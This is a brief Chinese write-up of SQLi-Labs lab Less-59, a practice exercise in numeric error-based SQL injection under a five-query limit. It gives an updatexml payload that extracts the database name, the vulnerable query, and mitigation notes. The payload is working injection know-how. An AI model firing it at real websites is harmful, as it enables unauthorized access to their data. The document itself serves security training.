# SQLi-Labs | Less-59 挑战关卡 数字型报错注入 5次机会
## 一、漏洞简介
GET数字型注入，无查询回显，报错注入，session限制5次查询。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-59/?id=1
注入类型：GET、数字型、报错注入、次数限制
## 三、复现步骤
1. ?id=1' 无报错，数字型。
2. updatexml报错注入，5次内拿到flag。
## 四、Payload
`?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1) --+`
## 五、漏洞原理
`SELECT * FROM users WHERE id=$id LIMIT 0,1`
无查询回显，报错注入，次数限制。
## 六、修复方案
1. 预编译，关闭错误回显，限流。
## 七、总结
Less59数字型报错注入，5次机会挑战。